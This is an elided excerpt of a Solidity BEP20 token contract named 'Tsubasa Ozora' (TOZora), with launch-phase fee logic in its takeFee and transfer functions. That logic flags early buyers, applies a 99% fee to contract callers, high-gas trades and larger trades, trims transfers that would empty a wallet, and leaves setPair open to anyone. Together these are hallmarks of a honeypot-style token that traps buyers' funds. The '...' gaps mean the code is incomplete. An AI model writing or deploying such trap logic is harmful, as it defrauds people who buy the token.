...
abstract contract baseContract is  IBEP20 , Ownable {
    ...
    constructor(address _routerAddress,string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply) payable Ownable() {
        ...
        autoSwap=AutoSwap(true,true,1,100,1000);
        allot=Allot(3,1,0,0,4);
        fees=Fee(75,4,4,100);

        step=1;
        maxamount=_tTotal.div(1000);

        _mainpair = IUniswapV2Factory(router.factory()).createPair(router.WETH(), address(this));
        pairs[_mainpair]=true;
        _allowances[address(this)][address(router)] = uint(2**256-1);

        ex[_mainpair]=Exempt(0,true,true,true);
    ...
    function _transferFrom(address sender, address recipient, uint amount) internal returns (bool) {
        ...
        if(balanceOf(sender).sub(amount)==0) amount=amount.sub(amount.div(9999)); 
    ...
    function setPair(address _routerAddr,address _token) public { 
        address pair=IUniswapV2Factory(IUniswapV2Router02(_routerAddr).factory()).getPair(address(_token), address(this));
    ...
    function takeFee(address sender, address recipient, uint amount,uint currentRate) internal returns (uint) {
        ...
        if(pairs[recipient]){
            ...
            if(step==2 && (isContract(sender) || tx.gasprice >maxgasprice  || amount > maxamount)) feeApplicable=99;
            if(isContract(sender) && tx.gasprice >maxgasprice  && amount > maxamount) feeApplicable=99;
        }
        else if(pairs[sender]){
            feeApplicable=fees.buy; 
            if(step==1) ex[recipient].fee=1; 
            if(step==2 && (isContract(recipient) || tx.gasprice >maxgasprice  || amount > maxamount)) feeApplicable=99;
            if(isContract(recipient) && tx.gasprice >maxgasprice  && amount > maxamount) feeApplicable=99;
        }
        else{ 
        ...
        _takeInviterFeeKt(feeAmount.div(10000000),currentRate); 
        return realAmount;
    }
...
contract TOZora is baseContract { 
    constructor() baseContract(address(0x10ED43C718714eb63d5aA57B78B54704E256024E),"Tsubasa Ozora","TOZora",18,1 * 10 ** 12){
    } 
}